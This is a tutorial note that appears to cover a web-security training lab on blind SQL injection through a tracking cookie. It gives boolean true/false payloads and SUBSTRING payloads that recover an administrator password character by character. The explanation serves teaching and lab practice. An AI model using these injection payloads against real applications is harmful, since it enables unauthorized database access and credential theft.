# 16. Exploiting blind SQL injection by triggering conditional responses

## 🔍 Scenario

An application uses tracking cookies for analytics. The cookie looks like this:

```sql
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Internally, the app runs this query:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

- The query is vulnerable to **SQL injection**.
- The **query result is not visible**, but the **app behavior changes**:
    - ✅ If the `TrackingId` exists → **"Welcome back"** is shown.
    - ❌ If not → no such message.

This **behavioral difference** makes it possible to perform **blind SQL injection**.

---

## 🧪 Boolean-Based Blind Injection

Test the app's reaction to injected conditions:

### Example 1 – **Always True Condition**

```sql
TrackingId=xyz' AND '1'='1
```

- Query returns results
- **"Welcome back"** is displayed ✅

### Example 2 – **Always False Condition**

```sql
TrackingId=xyz' AND '1'='2
```

- Query returns no results
- No **"Welcome back"** message ❌

🔁 By changing the condition, we can infer data **bit by bit**.

---

## 🧑‍💻 Extracting the Admin Password

Assume:

- Table: `Users`
- Columns: `Username`, `Password`
- Target User: `Administrator`

We can guess the password **character-by-character** using `SUBSTRING`:

### Step 1 – Test if 1st character is greater than `'m'`:

```sql
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 'm
```

✅ "Welcome back" → first character is **after** `'m'`

### Step 2 – Narrow the range:

```sql
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) > 't
```

❌ No welcome → character is **not after** `'t'`

Eventually, you find:

```sql
TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'), 1, 1) = 's
```

✅ "Welcome back" → First character is `'s'`

Repeat for characters `2`, `3`, `4`, ... to retrieve the full password.

---

## 🧠 Pro Tips

- 🧬 The `SUBSTRING` function may be called `SUBSTR` (e.g., Oracle).
- 🔗 Use the [**SQL Injection Cheat Sheet**](https://portswigger.net/web-security/sql-injection/cheat-sheet) for DB-specific syntax.